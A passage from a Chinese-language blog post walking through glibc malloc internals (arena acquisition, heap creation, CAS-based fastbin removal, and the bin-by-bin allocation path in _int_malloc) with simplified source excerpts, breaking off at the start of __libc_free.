title="arena_get"></a>arena_get</h3><p>介玩意是个宏,源代码里有一段解释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* arena_get() acquires an arena and locks the corresponding mutex.</span></span><br><span class="line"><span class="comment">   First, try the one last locked successfully by this thread.  (This</span></span><br><span class="line"><span class="comment">   is the common case and handled with a macro for speed.)  Then, loop</span></span><br><span class="line"><span class="comment">   once over the circularly linked list of arenas.  If no arena is</span></span><br><span class="line"><span class="comment">   readily available, create a new one.  In this latter case, `size&#x27;</span></span><br><span class="line"><span class="comment">   is just a hint as to how much memory will be required immediately</span></span><br><span class="line"><span class="comment">   in the new arena. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      ptr = thread_arena;      \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (ptr)      \</span></span><br><span class="line"><span class="meta">        __libc_lock_lock (ptr-&gt;mutex);      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">else</span>      \</span></span><br><span class="line"><span class="meta">        ptr = arena_get2 ((size), NULL);      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>arena_get可以精简成如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size) do &#123;                \</span></span><br><span class="line"><span class="meta">  ptr = thread_arena;                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (ptr) &#123; __libc_lock_lock (ptr-&gt;mutex); &#125;  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; ptr = arena_get2 ((size), NULL); &#125;    \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>可见主要的实现在arena_get2这个函数里，它的主要作用是为当前线程获取一个可用的arena，这个函数的实现很复杂，考虑了各种情况，函数里又嵌套调用了多个函数，我把关键的流程总结在下图里：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_171208.png" alt=""></p><p>上图可以看到，arena_get2的flow里主要调用了get_free_list、reused_arena、_int_new_arena这三个函数，这里不详细讲解每一个函数了，它们的作用从函数名就可以看出来，这三个函数里面_int_new_arena更重要一些，后面着重讲一下这一个函数。</p><h3 id="int-new-arena"><a href="#int-new-arena" class="headerlink" title="_int_new_arena"></a>_int_new_arena</h3><p>这个函数如前图所示，它是用来在arena的个数超出限制之前创建新的arena的，关键代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> mstate _int_new_arena(<span class="type">size_t</span> size) &#123;</span><br><span class="line">  <span class="comment">// 用指定size创建一个新的heap_info对象</span></span><br><span class="line">  heap_info *h = new_heap(size + (<span class="keyword">sizeof</span>(heap_info) </span><br><span class="line">      + <span class="keyword">sizeof</span>(malloc_state) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">    <span class="comment">// 如果size过大导致new_heap失败，则创建一个只包含</span></span><br><span class="line">    <span class="comment">// 基础数据结构heap_info和malloc_state的对象</span></span><br><span class="line">    h = new_heap (<span class="keyword">sizeof</span> (heap_info) + <span class="keyword">sizeof</span> (malloc_state) </span><br><span class="line">        + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">    <span class="keyword">if</span> (!h) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 初始化malloc_state</span></span><br><span class="line">  malloc_state *a = h-&gt;ar_ptr = (malloc_state *) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置malloc_state中的top chunk指针</span></span><br><span class="line">  <span class="comment">// 设置top chunk的header</span></span><br><span class="line">  <span class="type">char</span> *ptr = (<span class="type">char</span> *)(a + <span class="number">1</span>);</span><br><span class="line">  top(a) = (mchunkptr)ptr;</span><br><span class="line">  set_head(top(a), (((<span class="type">char</span> *)h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更新malloc_state中的next链表，把新建的arena加到链表中</span></span><br><span class="line">  thread_arena = a;</span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面再用一张memory layout的图示来展示刚创建过的arena长什么样子：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_192109.png" alt=""></p><p>前面的_int_new_arena函数中调用了new_heap这个函数，这个函数主要是通过mmap对应的系统调用来通过操作系统分配空间，精简过的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> heap_info *<span class="title function_">new_heap</span><span class="params">(<span class="type">size_t</span> size, <span class="type">size_t</span> top_pad)</span> &#123;</span><br><span class="line">  <span class="comment">// 通过系统调用分配内存</span></span><br><span class="line">  <span class="type">char</span> *p2 = (<span class="type">char</span> *)MMAP(aligned_heap_area, </span><br><span class="line">      HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">  <span class="keyword">if</span> (__mprotect(p2, size, </span><br><span class="line">      mtag_mmap_flags | PROT_READ | PROT_WRITE) != <span class="number">0</span>) &#123;</span><br><span class="line">    __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 初始化heap_info结构体</span></span><br><span class="line">  heap_info *h = (heap_info *)p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>还是先贴一个总流程图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/1638952496892-1639312615182.png" alt=""></p><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/brk&amp;mmap.png" alt=""></p><p><code>brk(*pointer)</code></p><p><code>sbrk(size)</code></p><p>二者都返回拓展后的当前堆的末尾地址</p><h3 id="CAS操作"><a href="#CAS操作" class="headerlink" title="CAS操作"></a>CAS操作</h3><p>在malloc的实现中，需要频繁的插入和删除各个bin中的chunk，很多地方用到了CAS操作，因为用的比较多，这里先简单介绍一下</p><p>CAS是compare and swap的缩写，它是原子操作的一种，可用于在多线程编程中实现不被打断的数据交换操作，从而避免多线程同时改写某一数据时由于执行顺序不确定性以及中断的不可预知性产生的数据不一致问题，该操作通过将内存中的值与指定数据进行比较，当数值一样时将内存中的数据替换为新的值。</p><p>CAS需要有3个操作数：内存地址V，旧的预期值A，即将要更新的目标值B，CAS指令执行时，当且仅当内存地址V的值与预期值A相等时，将内存地址V的值修改为B，否则就什么都不做，整个比较并替换的操作是一个原子操作，下面举一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)                     \</span></span><br><span class="line"><span class="meta">  do &#123;                                                \</span></span><br><span class="line"><span class="meta">    victim = pp;                                      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (victim == NULL)                               \</span></span><br><span class="line"><span class="meta">      break;                                          \</span></span><br><span class="line"><span class="meta">    pp = REVEAL_PTR(victim-&gt;fd);                      \</span></span><br><span class="line"><span class="meta">  &#125; while ((pp = catomic_compare_and_exchange_val_acq \</span></span><br><span class="line"><span class="meta">      (fb, pp, victim)) != victim);</span></span><br></pre></td></tr></table></figure><p>上面这段代码是用来从fast bin中删除一个chunk，我们这里只关注<em>catomic_compare_and_exchange_val_acq(fb, pp, victim)</em>这个函数调用，其中fb是表头，pp新的节点，victim是老的节点，需要把老节点删掉，把新节点接上，这个调用就是通过CAS操作保证thread-safe的，以x86平台为例，一直往下追，最底层的实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __arch_c_compare_and_exchange_val_32_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123;                                                                  \</span></span><br><span class="line"><span class="meta">    __typeof(*mem) ret;                                               \</span></span><br><span class="line"><span class="meta">    __asm __volatile(<span class="string">&quot;cmpl $0, %%&quot;</span> SEG_REG <span class="string">&quot;:%P5\n\t&quot;</span>                 \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;je 0f\n\t&quot;</span>                                      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;lock\n&quot;</span>                                         \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;0:\tcmpxchgl %2, %1&quot;</span>                            \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=a&quot;</span>(ret), <span class="string">&quot;=m&quot;</span>(*mem)                          \</span></span><br><span class="line"><span class="meta">                     : BR_CONSTRAINT(newval), <span class="string">&quot;m&quot;</span>(*mem), <span class="string">&quot;0&quot;</span>(oldval), \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span>(offsetof(tcbhead_t, multiple_threads)));   \</span></span><br><span class="line"><span class="meta">    ret;                                                              \</span></span><br><span class="line"><span class="meta">  &#125;)</span></span><br></pre></td></tr></table></figure><p>这是一段x86的内联汇编，GCC的内联汇编语法大家可以自行查阅相关资料，这里只关注lock和cmpxchgl这两个指令，lock确保对内存的read/write操作原子执行，cmpxchgl用来比较并交换操作数，所以归根结底，CAS操作还是通过硬件指令的支持才能实现原子操作。</p><h3 id="从fastbin分配"><a href="#从fastbin分配" class="headerlink" title="从fastbin分配"></a>从fastbin分配</h3><p>在_int_malloc的开始，先看申请的内存大小nb是否符合fast bin的限制，符合的话，首先进入fast bin的分配代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nb &lt;= get_max_fast()) &#123;</span><br><span class="line">  idx = fastbin_index(nb);</span><br><span class="line">  mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">  mchunkptr pp;</span><br><span class="line">  <span class="keyword">if</span> ((victim = *fb) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    REMOVE_FB(fb, pp, victim);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会根据nb得到fast bin的index，再根据index，得到指向所在bin的head指针fb，如果这个bin非空，则取第一个chunk，使用前面介绍的REMOVE_FB将其从所在bin删除，并将取到的chunk返回。</p><h3 id="从smallbin分配"><a href="#从smallbin分配" class="headerlink" title="从smallbin分配"></a>从smallbin分配</h3><p>不符合fast bin分配条件的话，会继续看是否符合small bin的分配条件，这部分的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">  idx = smallbin_index(nb);</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">    bin-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      set_non_main_arena(victim);</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的处理过程和fast bin类似，也是根据nb定位到所在的bin，所在bin非空的话，就分配成功，返回得到的chunk，并且从所在bin中删除，和fast bin的最大不同之处在于这里操作的是双向链表。</p><h3 id="merge-fast-bin-into-unsorted-bin"><a href="#merge-fast-bin-into-unsorted-bin" class="headerlink" title="merge fast bin into unsorted bin"></a><strong>merge fast bin into unsorted bin</strong></h3><p>在fast bin和small bin都分配失败之后，会把fast bin中的chunk进行一次整理合并，然后将合并后的chunk放入unsorted bin中，这是通过malloc_consolidate这个函数完成的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="comment">// 因为这里会release所有的fast bin，所以先把相应flag disable</span></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line">  maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// 两层循环</span></span><br><span class="line">  <span class="comment">// 1. 外层循环遍历所有fast bin</span></span><br><span class="line">  <span class="comment">// 2. 内层循环遍历bin中所有chunk</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 内层循环主要做了下面几件事，代码太长，略了</span></span><br><span class="line">        <span class="comment">// 1. 如果当前chunk的前一个chunk是free状态，进行合并</span></span><br><span class="line">        <span class="comment">// 2. 如果当前chunk的后一个chunk是free状态，进行合并</span></span><br><span class="line">        <span class="comment">// 3. 如果合并后的chunk不和top chunk挨着，</span></span><br><span class="line">        <span class="comment">//    将合并后的chunk插入到unsorted bin中</span></span><br><span class="line">        <span class="comment">// 4. 如果合并后的chunk和top chunk挨着，</span></span><br><span class="line">        <span class="comment">//    重新设置top chunk的起始位置</span></span><br><span class="line">      &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从unsorted-bin中分配"><a href="#尝试从unsorted-bin中分配" class="headerlink" title="尝试从unsorted bin中分配"></a><strong>尝试从unsorted bin中分配</strong></h3><p>这部分代码已经进入_int_malloc中最后那个最大的for循环了，这部分的工作在for循环的刚开始，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第一部分代码</span></span><br><span class="line">  <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line">    mchunkptr next = chunk_at_offset(victim, size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 符合这四个条件的话，从last remainder chunk分配</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb) </span><br><span class="line">        &amp;&amp; bck == unsorted_chunks(av) </span><br><span class="line">        &amp;&amp; victim == av-&gt;last_remainder </span><br><span class="line">        &amp;&amp; size &gt; (nb + MINSIZE)) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 。。。</span></span><br><span class="line">    <span class="comment">// 正好遇到请求大小的chunk，分配成功</span></span><br><span class="line">    <span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 当前chunk属于small bin的范围，将其放回small bin</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 当前chunk属于large bin的范围，将其放回large bin</span></span><br><span class="line">      <span class="comment">// 。。。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从unsorted bin中删除当前chunk</span></span><br><span class="line">    <span class="comment">// 。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断最大循环次数</span></span><br><span class="line">    <span class="keyword">if</span> (++iters &gt;= <span class="number">10000</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从large-bin中分配"><a href="#尝试从large-bin中分配" class="headerlink" title="尝试从large bin中分配"></a>尝试从large bin中分配</h3><p>这是_int_malloc中最后那个大for循环的第二部分代码，在从unsorted bin分配失败之后，准备从large bin分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第二部分代码</span></span><br><span class="line">  <span class="comment">// 判断nb的大小，符合条件的话从large bin分配</span></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断前面得到的bin是否为空</span></span><br><span class="line">    <span class="comment">// 不为空的话最大的chunk size是否大于等于请求大小nb</span></span><br><span class="line">    victim = first(bin);</span><br><span class="line">    <span class="keyword">if</span> (victim != bin &amp;&amp; chunksize_nomask(victim) &gt;= nb) &#123;</span><br><span class="line">      <span class="comment">// 1. 用best fit算法找到最合适大小的chunk</span></span><br><span class="line">      <span class="comment">// 2. 对这个chunk进行split，一部分返回给用户，</span></span><br><span class="line">      <span class="comment">// 剩余部分赋值给malloc_state中的remainder，</span></span><br><span class="line">      <span class="comment">// 同时插入到unsorted bin当中</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 在请求大小nb所在的bin分配失败，继续从后面的bin来分配，</span></span><br><span class="line">  <span class="comment">// 在查找后面bin的过程中，会用到binmap来加快查找速度</span></span><br><span class="line">  ++idx;</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line">  block = idx2block(idx);</span><br><span class="line">  <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">  bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// 如果后面没有找到合适的bin，就跳到use_top使用top chunk来分配</span></span><br><span class="line">    <span class="comment">// 如果后面找到了合适的bin，那么：</span></span><br><span class="line">    <span class="comment">// 1. 用best fit算法找到最合适大小的chunk</span></span><br><span class="line">    <span class="comment">// 2. 对这个chunk进行split，一部分返回给用户，</span></span><br><span class="line">    <span class="comment">// 剩余部分赋值给malloc_state中的remainder，</span></span><br><span class="line">    <span class="comment">// 同时插入到unsorted bin当中</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="尝试从top-chunk中分配"><a href="#尝试从top-chunk中分配" class="headerlink" title="尝试从top chunk中分配"></a>尝试从top chunk中分配</h3><p>这是_int_malloc中最后那个大for循环的第三部分代码，在从large bin分配失败之后，准备从top chunk分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// for循环的第三部分代码</span></span><br><span class="line">  <span class="comment">// 前面都分配失败，从top chunk分配</span></span><br><span class="line">use_top:</span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line">  <span class="keyword">if</span> (size &gt;= (nb + MINSIZE)) &#123;</span><br><span class="line">    <span class="comment">// top chunk的大小如果满足要求，分配成功</span></span><br><span class="line">    <span class="comment">// 剩余的部分成为新的top chunk，同时也会成为remainder</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, ...);</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (av-&gt;have_fastchunks) &#123;</span><br><span class="line">    <span class="comment">// 如果fast bin flag被设置，</span></span><br><span class="line">    <span class="comment">// 再重新release fast bin的内容到unsorted bin中，</span></span><br><span class="line">    <span class="comment">// 并且重新得到请求大小所在bin的index</span></span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果top chunk也不满足请求大小，</span></span><br><span class="line">    <span class="comment">// 就使用系统调用增加top chunk，或者再开辟出一块heap</span></span><br><span class="line">    <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="free入口"><a href="#free入口" class="headerlink" title="free入口"></a>free入口</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem) &#123;</span><br><span class="line">  <span class="comment">// part1</span></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = </span><br><span class="line">        atomic_forced_read(__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// part2</span></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// part3</span></span><br><span class="line">  mchunkptr p = mem2chunk(mem);</span><br><span class="line">  <span class="keyword">if</span> 